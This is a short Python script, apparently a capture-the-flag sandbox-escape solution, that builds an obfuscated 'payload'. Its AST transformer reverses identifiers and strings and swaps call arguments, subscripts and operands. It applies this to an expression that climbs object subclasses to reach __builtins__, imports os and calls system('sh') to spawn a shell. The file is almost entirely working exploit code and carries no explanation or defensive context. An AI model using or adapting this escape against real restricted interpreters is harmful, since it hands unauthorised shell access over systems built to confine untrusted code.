import ast

class tsa(ast.NodeTransformer):
    def visit_Call(self, node):
        # llaC()
        self.generic_visit(node)
        if node.args:
            node.func, node.args[0] = node.args[0], node.func
        return node

    def visit_Name(self, node):
        # emaN()
        if isinstance(node.id, str):
            node.id = node.id[::-1]
        return node

    def visit_Constant(self, node):
        # tnatsnoC()
        if isinstance(node.value, str):
            node.value = node.value[::-1]
        return node

    def visit_Attribute(self, node):
        #etubirttA()
        self.generic_visit(node)
        if isinstance(node.attr, str):
            new_value = ast.Name(id=node.attr, ctx=ast.Load())
            if isinstance(node.value, ast.Name):
                node.attr = node.value.id
            elif isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                node.attr = node.value.value
            else:
                node.attr = "rorre_tsa"
            node.value = new_value
        return node

    def visit_Subscript(self, node):
        #tpircsbuS()
        node.value, node.slice = node.slice, node.value
        return node
    
    def visit_BinOp(self, node):
        node.left, node.right = node.right, node.left
        return node

code = "(o:=[i for i in ().__class__.__base__.__subclasses__() if 'wrap_' in f'{i}'][0].__init__.__builtins__['__import__']('os'), s:=o.metsys, s('sh'))"

tree = ast.parse(code, mode='eval')

transformer = tsa()
transformed = transformer.visit(tree)

payload = ast.unparse(transformed)
print(payload)